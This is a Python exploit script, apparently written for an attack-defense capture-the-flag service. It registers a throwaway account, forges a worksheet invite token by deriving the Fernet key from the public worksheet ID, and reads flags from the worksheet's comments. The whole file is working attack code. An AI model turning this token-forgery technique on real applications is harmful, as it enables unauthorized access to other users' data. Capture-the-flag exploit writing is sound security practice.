import re
import sys
import time
import chall
import random
import string

from requests import RequestException
import base64

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.kbkdf import (CounterLocation, KBKDFHMAC, Mode)

def die(msg):
    print(msg)
    exit(1)

def rand_str() -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def exploit(ip, flag_id):
    ch = chall.Challenge(f'{ip}:8000')
    worksheet_id = flag_id # change when it becomes a json

    username, password = rand_str(), rand_str()
    try:
        ch.register_and_login(username, password)
    except RequestException as e:
        die('Could not register' + str(e))

    kdf = KBKDFHMAC(
        algorithm=hashes.MD5(),
        mode=Mode.CounterMode,
        length=32, rlen=4, llen=4,
        location=CounterLocation.BeforeFixed,
        label=None, context=None, fixed=None
    )

    key = kdf.derive(bytes.fromhex(worksheet_id))

    f = Fernet(base64.urlsafe_b64encode(key))
    token = f.encrypt(bytes.fromhex(worksheet_id)).decode()

    try:
        ch.accept_worksheet_invite(worksheet_id, token)
    except:
        die('Could not redeem token' + str(e))
    
    try:
        w = ch.get_worksheet(worksheet_id)
    except RequestException:
        die('Could not get worksheet' + str(e))

    flags = ""
    for comment in w['comments']:
        try:
            flags += comment['content']
        except:
            pass
    return flags

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))